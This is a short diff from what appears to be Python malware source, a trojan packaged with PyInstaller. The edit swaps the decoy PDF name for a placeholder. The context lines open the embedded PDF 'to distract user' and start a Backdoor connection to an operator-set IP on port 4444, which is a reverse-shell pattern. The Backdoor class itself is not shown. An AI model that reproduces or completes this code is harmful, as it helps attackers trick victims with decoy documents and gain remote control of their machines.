@@ -75,7 +75,7 @@ class Backdoor:
 try:
     # Try to open the embedded PDF to distract user
     if hasattr(sys, '_MEIPASS'):
-        pdf_path = os.path.join(sys._MEIPASS, 'sample.pdf')
+        pdf_path = os.path.join(sys._MEIPASS, 'ENTER YOUR PDF WHICH YOU WANNA USE')
         subprocess.Popen(pdf_path, shell=True)
 
     my_backdoor = Backdoor("ENTER YOUR IP", 4444) #port and ip can be configured by you
